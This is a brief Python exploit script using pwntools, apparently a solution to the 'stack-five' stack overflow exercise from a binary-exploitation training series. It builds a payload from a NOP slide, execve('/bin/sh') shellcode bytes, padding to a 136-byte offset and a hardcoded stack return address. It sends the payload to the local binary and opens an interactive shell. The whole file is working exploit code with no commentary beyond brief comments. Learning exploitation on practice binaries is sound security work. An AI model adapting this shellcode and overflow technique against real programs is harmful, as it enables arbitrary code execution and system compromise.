from pwn import *


# our small nop slide
nop_slide = "\x90" * 20
# point on the stack we control
rip = p64(0x00007fffffffe5f0)
# shellcode : sys_execve system call calling /bin/sh
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
# A's with our offset amount minus the size of our shellcode & nops
padding = "A" * (136 - len(shellcode) - len(nop_slide))

payload = nop_slide + shellcode + padding + rip


program = process("./stack-five")
program.recvuntil("\n")
program.sendline(payload)
program.interactive()
